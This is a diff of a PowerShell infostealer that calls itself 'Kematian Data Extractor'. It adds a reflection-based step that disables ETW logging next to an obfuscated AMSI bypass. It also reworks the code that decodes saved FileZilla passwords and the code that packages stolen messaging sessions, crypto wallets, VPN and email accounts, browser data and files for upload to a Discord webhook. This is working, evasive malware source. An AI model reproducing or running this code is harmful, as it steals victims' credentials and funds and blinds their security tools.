@@ -64,10 +64,11 @@ public static class ProcessUtility
 "@
 #END OF CODE MADE BY EvilByteCode
 
-# Request admin with AMSI bypass
+# Request admin with AMSI bypass and ETW Disable
 function CHECK_AND_PATCH {
     ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
     ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
+    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'),('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'),('NonPublic,Static')).GetValue($null),0))
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
@@ -606,23 +607,11 @@ function Backup-Data {
             $serverPort = $matches.Groups[2].Value
             $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
             # Check if both User and Pass are blank
-            if ([string]::IsNullOrWhiteSpace($serverUser)) {
-                return @"
-Host: $serverHost
-Port: $serverPort
-
-"@
-            }
+            if ([string]::IsNullOrWhiteSpace($serverUser)) {return "Host: $serverHost `nPort: $serverPort`n"}
             # if User is not blank, continue with authentication details
             $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
             $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
-            return @"
-Host: $serverHost
-Port: $serverPort
-User: $serverUser
-Pass: $decodedPass
-
-"@
+            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
         }       
         $serversInfo = @()
         foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
@@ -979,17 +968,7 @@ Pass: $decodedPass
         }
 
         # Add data to webhook
-        $webhookData = @"
-Messaging Sessions: $messaging_sessions_info
-Gaming Sessions: $gaming_sessions_info
-Crypto Wallets: $wallets_found_info
-VPN Accounts: $vpn_accounts_info
-Email Clients: $email_clients_info
-Important Files: $important_files_info
-Browser Data: $browser_data_info
-FileZilla: $filezilla_info
-"@
-
+        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFileZilla: $filezilla_info"
         return $webhookData
     }     
     $kematainwebhook = kematianinfo
@@ -1014,9 +993,6 @@ FileZilla: $filezilla_info
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
-        "content"     = "@everyone"
-        "title"       = "Kematian Data Extractor"
-        "description" = "Kematian"
         "color"       = "15105570"
         "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
         "url"         = "https://discord.com/invite/WJCNUpxnrE"
